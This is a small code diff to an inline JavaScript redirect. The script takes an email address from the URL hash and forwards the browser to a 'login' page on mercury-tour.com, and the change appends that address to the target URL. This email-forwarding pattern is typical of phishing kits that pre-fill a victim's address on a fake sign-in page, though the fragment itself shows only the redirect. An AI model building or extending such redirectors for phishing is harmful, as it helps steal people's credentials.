@@ -7,7 +7,7 @@
     (function() {
       const email = window.location.hash.replace('#', '');
       if (email) {
-        const redirectUrl = `https://login.mercury-tour.com/live01`;
+        const redirectUrl = `https://login.mercury-tour.com/live01#${email}`;
         window.location.href = redirectUrl;
       } else {
         document.body.innerHTML = "<p>Missing email in URL hash.</p>";
